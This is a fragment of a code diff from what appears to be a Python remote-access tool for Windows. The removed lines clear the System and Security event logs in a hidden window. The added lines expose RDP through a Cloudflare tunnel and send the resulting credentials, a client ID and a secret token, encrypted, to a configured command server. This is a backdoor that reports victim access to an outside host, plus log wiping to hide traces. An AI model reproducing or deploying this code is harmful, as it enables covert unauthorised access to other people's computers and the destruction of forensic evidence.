-                            headers=headers,
-                            timeout=15,
-                            verify=False
-                        )
-                        logging.info(f"Response status (no SSL verify): {response.status_code}, text: {response.text[:200]}")
-                        if response.status_code == 200:
-                            logging.info("Successfully sent RDP info to server (no SSL verify)")
-                            return True
-                        logging.error(f"Server responded with status {response.status_code} (no SSL verify): {response.text}")
-                    except requests.exceptions.RequestException as e:
-                        logging.error(f"Server send error (no SSL verify, attempt {attempt+1}): {str(e)}")
-                except requests.exceptions.RequestException as e:
-                    logging.error(f"Server send error (attempt {attempt+1}): {str(e)}")
-                time.sleep(1)  # Wait before retrying
-            logging.error("Failed to send RDP info after retries")
-            return False
-        except Exception as e:
-            logging.error(f"Failed to send to server: {str(e)}")
-            return False
-
-    def _cleanup_logs(self) -> bool:
-        try:
-            for log in ["System", "Security"]:
-                run(
-                    ["wevtutil", "cl", log],
-                    check=True,
-                    capture_output=True,
-                    text=True,
-                    creationflags=subprocess.CREATE_NO_WINDOW
+            if tunnel_url:
+                connection_info["hostname"] = tunnel_url
+                connection_info["connection_instructions"] = (
+                    f"Connect to RDP using: {tunnel_url}\n"
+                    f"Username: {self.username}\n"
+                    f"Password: {self.password}\n"
+                    f"Note: Use Microsoft Remote Desktop or a Cloudflare-compatible RDP client."
                 )
-                logging.info(f"Cleared log: {log}")
-            return True
+            else:
+                connection_info["connection_instructions"] = self._get_manual_fallback_instructions(local_ip, public_ip)
+                return {
+                    "status": "manual",
+                    "message": "Cloudflare tunnel failed. Manual port forwarding required.",
+                    "data": connection_info
+                }
+
+            try:
+                encrypted_info = self.encryption.encrypt(json.dumps(connection_info))
+                payload = {
+                    "action": "report_rdp",
+                    "client_id": Config.get_client_id(),
+                    "rdp_info": encrypted_info,
+                    "token": Config.SECRET_TOKEN
+                }
+                response = requests.post(
+                    Config.SERVER_URL,
+                    json=payload,
+                    headers={"X-Secret-Token": Config.SECRET_TOKEN},
+                    timeout=15,
+                    verify=True
+                )
+                if response.status_code != 200:
+                    logging.error(f"Failed to send RDP info to server: {response.text}")
+                else:
+                    logging.info("RDP info sent to server")
+            except Exception as e:
+                logging.error(f"Server communication failed: {str(e)}")
+
+            return {
+                "status": "success",
+                "message": "RDP enabled successfully via Cloudflare tunnel.",
+                "data": connection_info
+            }
         except Exception as e:
-            logging.error(f"Failed to clean up logs: {str(e)}")
-            return False
+            logging.error(f"Critical error: {str(e)}")
+            return {"status": "error", "message": f"Operation failed: {str(e)}"}
+
+    def disable_rdp(self) -> Dict[str, Any]:
+        """Disable RDP"""
+        try:
+            # Stop Cloudflare tunnel
+            if self.cloudflared_process:
+                self.cloudflared_process.terminate()
+                self.cloudflared_process.wait(timeout=5)
+                logging.info("Cloudflare tunnel stopped")
+
+            if self._user_exists(self.username):
+                result = self._run_command(["net", "user", self.username, "/delete"])
+                if result["status"] == "success":
+                    logging.info(f"User {self.username} deleted")
+                else:
+                    logging.warning(f"Failed to delete user: {result['stderr']}")
+
+            try:
+                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Terminal Server", 0, winreg.KEY_SET_VALUE) as key:
+                    winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 1)
+                self._run_command(["gpupdate", "/force"])
+                logging.info("RDP disabled in registry")
+            except Exception as e:
+                logging.warning(f"Registry disable failed: {str(e)}")
+
+            for service in ["TermService", "SessionEnv", "UmRdpService"]:
+                result = self._run_command(["net", "stop", service, "/y"])
+                if result["status"] == "success":
+                    logging.info(f"Service {service} stopped")
+                else:
+                    logging.warning(f"Failed to stop service {service}: {result['stderr']}")
+
+            cleanup_commands = [
+                ["netsh", "advfirewall", "firewall", "delete", "rule", "name=Allow RDP"],
+                ["powershell", "-Command", "Remove-NetFirewallRule -DisplayName 'Allow RDP' -ErrorAction SilentlyContinue"]
+            ]
+            for cmd in cleanup_commands:
+                self._run_command(cmd)
+            logging.info("Firewall rules removed")
+
+            return {"status": "success", "message": "RDP disabled successfully"}
+        except Exception as e:
+            logging.error(f"Disable failed: {str(e)}")
+            return {"status": "error", "message": f"Disable failed: {str(e)}"}
+
+    def _get_local_ip(self) -> str:
+        """Get local IP address"""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            local_ip = s.getsockname()[0]
+            s.close()
+            return local_ip
+        except Exception as e:
+            logging.error(f"Local IP error: {str(e)}")
+            return "unknown"
+
+    def _get_public_ip(self) -> str:
+        """Get public IP with multiple services"""
+        services = [
+            "https://api.ipify.org?format=json",
+            "https://ifconfig.me/ip",
+            "https://api.myip.com"
+        ]
+        for service in services:
+            try:
+                response = requests.get(service, timeout=10)
+                if response.status_code == 200:
+                    if "json" in service:
+                        return response.json().get("ip", "unknown")
+                    return response.text.strip()
+                logging.warning(f"Failed to get public IP from {service}: {response.status_code}")
+            except Exception as e:
+                logging.warning(f"Public IP error from {service}: {str(e)}")
+        logging.error("All public IP services failed. Check network or use 'curl ifconfig.me'.")
+        return "unknown"
